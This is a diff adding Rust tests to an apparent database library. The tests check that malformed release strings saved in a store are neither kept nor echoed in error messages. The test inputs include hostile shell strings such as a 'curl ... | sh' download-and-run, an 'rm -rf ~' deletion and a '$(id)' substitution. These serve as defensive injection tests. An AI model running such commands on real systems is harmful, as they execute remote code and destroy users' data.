@@ -280,6 +280,120 @@ fn a_refused_store_names_the_release_that_last_saved_it_whoever_reads_it() {
     );
 }
 
+/// What a refusal of the store at `path` says, with the release it carries.
+fn refused_naming(path: &Path) -> (Option<String>, String) {
+    match open(path) {
+        Err(error @ CoreError::WrongSchema { .. }) => {
+            let said = error.to_string();
+            let CoreError::WrongSchema { release, .. } = error else {
+                unreachable!()
+            };
+            (release, said)
+        }
+        other => panic!("{} opened as {other:?}", path.display()),
+    }
+}
+
+#[test]
+fn a_release_that_is_not_three_numbers_is_not_named_or_put_in_a_command() {
+    let hostile = [
+        "0.0.80\u{1b}[31m; curl https://example.test/x | sh",
+        "0.0.80 && rm -rf ~",
+        "0.0.80\n",
+        "$(id).0.1",
+        "v0.0.80",
+        "0.0",
+        "0.0.80.1",
+        "0..80",
+        "",
+        "\u{ff10}.\u{ff10}.\u{ff18}\u{ff10}",
+        "0.0.-1",
+    ];
+    for text in hostile {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("core.sqlite");
+        {
+            let conn = open(&path).unwrap();
+            queue_one(&conn);
+            meta_set(&conn, META_RELEASE, text).unwrap();
+        }
+        at_version(&path, SCHEMA_VERSION + 1);
+        for (release, said) in [
+            refused_naming(&path),
+            match refusal(&path).unwrap().unwrap() {
+                error @ CoreError::WrongSchema { .. } => {
+                    let said = error.to_string();
+                    let CoreError::WrongSchema { release, .. } = error else {
+                        unreachable!()
+                    };
+                    (release, said)
+                }
+                other => panic!("refused as {other:?}"),
+            },
+        ] {
+            assert_eq!(release, None, "{text:?} was kept as a release");
+            assert!(
+                said.contains("the release that last saved it is not known"),
+                "{text:?}: {said}"
+            );
+            assert!(!said.contains("MARFA_VERSION"), "{text:?}: {said}");
+            assert!(
+                !said.contains('\u{1b}') && !said.contains("curl") && !said.contains("rm -rf"),
+                "{text:?}: {said}"
+            );
+        }
+    }
+    // The witness: a release as the stamp writes one is kept.
+    for text in ["0.0.80", "12.34.567"] {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("core.sqlite");
+        drop(open(&path).unwrap());
+        meta_set(&Connection::open(&path).unwrap(), META_RELEASE, text).unwrap();
+        at_version(&path, SCHEMA_VERSION + 1);
+        assert_eq!(refused_naming(&path).0.as_deref(), Some(text));
+    }
+}
+
+#[test]
+fn a_store_that_cannot_take_the_release_record_still_opens_and_says_the_release_is_not_known() {
+    for before in [None, Some("0.0.1")] {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("core.sqlite");
+        drop(open(&path).unwrap());
+        {
+            let conn = Connection::open(&path).unwrap();
+            conn.execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
+                .unwrap();
+            if let Some(release) = before {
+                meta_set(&conn, META_RELEASE, release).unwrap();
+            }
+            // A write the store refuses, as a full disk or a busy writer would.
+            conn.execute_batch(
+                "CREATE TRIGGER no_release_insert BEFORE INSERT ON meta
+                   WHEN NEW.key = 'release' BEGIN SELECT RAISE(ABORT, 'database or disk is full'); END;
+                 CREATE TRIGGER no_release_update BEFORE UPDATE ON meta
+                   WHEN NEW.key = 'release' BEGIN SELECT RAISE(ABORT, 'database or disk is full'); END;",
+            )
+            .unwrap();
+        }
+        let conn = open(&path).expect("an open that needs no write failed on the release record");
+        assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
+        drop(conn);
+        assert_eq!(
+            release_of(&path),
+            None,
+            "a record this build could not renew was left naming {before:?}"
+        );
+        at_version(&path, SCHEMA_VERSION + 1);
+        let (release, said) = refused_naming(&path);
+        assert_eq!(release, None);
+        assert!(
+            said.contains("the release that last saved it is not known"),
+            "{said}"
+        );
+    }
+}
+
 #[test]
 fn two_programs_making_one_store_at_once_both_open_it() {
     let dir = tempfile::tempdir().unwrap();
